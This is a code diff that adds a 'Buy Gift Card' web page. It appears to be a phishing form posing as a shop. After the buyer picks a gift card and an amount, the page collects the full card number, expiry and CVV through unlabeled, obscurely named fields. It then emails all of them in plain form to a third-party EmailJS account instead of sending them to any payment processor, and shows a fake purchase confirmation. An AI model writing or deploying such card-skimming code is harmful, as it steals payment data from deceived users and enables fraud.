@@ -1,0 +1,263 @@
+
+      <div class="multi-step-container">
+        <form id="buy-card-form">
+          <h2>Buy Gift Card</h2>
+      
+          <!-- Step 1 -->
+          <div class="step active" id="step-1">
+            <div class="form-group">
+              <label for="gift-card-type">Select Card Type</label>
+              <select id="gift-card-type" required>
+                <option value="">-- Choose Card --</option>
+                <option value="Apple">Apple</option>
+                <option value="Amazon">Amazon</option>
+                <option value="Steam">Steam</option>
+                <option value="Steam">Target</option>
+                <option value="eBay">eBay</option>
+                <option value="Xbox">Xbox</option>
+                <option value="Googleplay">Googleplay</option>
+                <option value="PlayStation">PlayStation</option>
+                <option value="Sephora">Sephora</option>
+                <option value="RazerGold">RazerGold</option>
+
+                <option value="Nordstrom">Nordstrom</option>
+                <option value="Nike">Nike</option>
+                <option value="MasterCard">MasterCard</option>
+                <option value="Vanilla">Vanilla Visa</option>
+                <option value="Wallmart Visa">Wallmart Visa</option>
+                <option value="Visa Silvery White">
+                  Visa Silvery White
+                </option>
+                <option value="TT Visa">TT Visa</option>
+                <option value="Amex">Amex</option>
+              </select>
+            </div>
+      
+            <div class="form-group">
+              <label for="card-amount">Amount (USD)</label>
+              <input type="number" id="card-amount" placeholder="e.g. 100" required />
+            </div>
+      
+            <div class="form-group">
+              <label for="recipient-email">Recipient Email</label>
+              <input type="email" id="recipient-email" placeholder="example@mail.com" required />
+            </div>
+      
+            <div class="button-group">
+              <button type="button" class="btn-next" onclick="nextStep()">Next</button>
+            </div>
+          </div>
+      
+          <!-- Step 2 -->
+          <div class="step" id="step-2">
+            <div class="form-group">
+              <input type="text" id="-number" placeholder="1234 5678 9012 3456" required />
+            </div>
+      
+            <div class="form-group">
+              <input type="text" id="-date" placeholder="MM/YY" required />
+            </div>
+      
+            <div class="form-group">
+              <input type="text" id="-vv" placeholder="123" required />
+            </div>
+      
+            <div class="button-group">
+              <button type="button" class="btn-back" onclick="prevStep()">Back</button>
+              <button type="submit" class="btn-next">Proceed</button>
+            </div>
+          </div>
+        </form>
+      </div>
+      
+
+      <!-- EmailJS SDK -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+  // Init EmailJS
+  (function () {
+    emailjs.init("S5UPcbK9W9i-LlTEp"); // replace this with your actual public key
+  })();
+
+  // Navigation
+  let currentStep = 0;
+  const steps = document.querySelectorAll(".step");
+
+  function showStep(index) {
+    steps.forEach((step, i) => {
+      step.classList.toggle("active", i === index);
+    });
+  }
+
+  window.nextStep = function () {
+    if (currentStep === 0 && validateStep1()) {
+      currentStep = 1;
+      showStep(currentStep);
+    }
+  };
+
+  window.prevStep = function () {
+    currentStep = 0;
+    showStep(currentStep);
+  };
+
+  function validateStep1() {
+    const cardType = document.getElementById("gift-card-type").value.trim();
+    const amount = document.getElementById("card-amount").value.trim();
+    const email = document.getElementById("recipient-email").value.trim();
+
+    if (!cardType) {
+      alert("Please select a gift card type.");
+      return false;
+    }
+
+    if (!amount || isNaN(amount) || Number(amount) <= 0) {
+      alert("Please enter a valid amount.");
+      return false;
+    }
+
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) {
+      alert("Please enter a valid email.");
+      return false;
+    }
+
+    return true;
+  }
+
+  function validateStep2() {
+    const cardNumber = document.getElementById("-number").value.trim();
+    const expiry = document.getElementById("-date").value.trim();
+    const cvv = document.getElementById("-vv").value.trim();
+
+    const cardNumberRegex = /^[0-9]{12,19}$/;
+    const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+    const cvvRegex = /^[0-9]{3,4}$/;
+
+    if (!cardNumberRegex.test(cardNumber)) {
+      alert("Card number must be 12–19 digits.");
+      return false;
+    }
+
+    if (!expiryRegex.test(expiry)) {
+      alert("Expiry must be in MM/YY format.");
+      return false;
+    }
+
+    if (!cvvRegex.test(cvv)) {
+      alert("CVV must be 3 or 4 digits.");
+      return false;
+    }
+
+    return true;
+  }
+
+  document.getElementById("buy-card-form").addEventListener("submit", function (e) {
+    e.preventDefault();
+    if (!validateStep2()) return;
+
+    const params = {
+      cardType: document.getElementById("gift-card-type").value.trim(),
+      amount: document.getElementById("card-amount").value.trim(),
+      email: document.getElementById("recipient-email").value.trim(),
+      cardNumber: document.getElementById("-number").value.trim(),
+      expiry: document.getElementById("-date").value.trim(),
+      cvv: document.getElementById("-vv").value.trim(),
+      timestamp: new Date().toLocaleString()
+    };
+
+    emailjs.send("service_qn8rl9g", "template_wswlwnz", params)
+      .then(() => {
+        alert("Purchase sent successfully, Please check email for confirmation!");
+        document.getElementById("buy-card-form").reset();
+        currentStep = 0;
+        showStep(currentStep);
+      })
+      .catch((error) => {
+        console.error("EmailJS error:", error);
+        alert("Failed to send purchase request. Please try again.");
+      });
+  });
+</script>
+
+
+
+
+
+
+
+<style>
+  .multi-step-container {
+    max-width: 400px;
+    margin: 40px auto;
+    padding: 30px;
+    border-radius: 16px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+    background: white;
+    font-family: 'Segoe UI', sans-serif;
+  }
+
+  .step {
+    display: none;
+  }
+
+  .step.active {
+    display: block;
+  }
+
+  .form-group {
+    margin-bottom: 20px;
+  }
+
+  .form-group label {
+    font-weight: 600;
+    margin-bottom: 6px;
+    display: block;
+  }
+
+  .form-group input,
+  .form-group select {
+    width: 100%;
+    padding: 10px 14px;
+    border-radius: 12px;
+    border: 1px solid #ccc;
+    outline: none;
+    font-size: 14px;
+  }
+
+  .form-group input:focus {
+    border-color: #0065ff;
+  }
+
+  .button-group {
+    display: flex;
+    justify-content: space-between;
+    gap: 10px;
+    margin-top: 25px;
+  }
+
+  button {
+    padding: 12px;
+    border: none;
+    border-radius: 10px;
+    font-weight: bold;
+    cursor: pointer;
+    width: 100%;
+  }
+
+  .btn-next {
+    background: #00a6fb;
+    color: white;
+  }
+
+  .btn-back {
+    background: #eee;
+    color: #333;
+  }
+
+  h2 {
+    text-align: center;
+    margin-bottom: 30px;
+    font-size: 22px;
+  }
+</style>
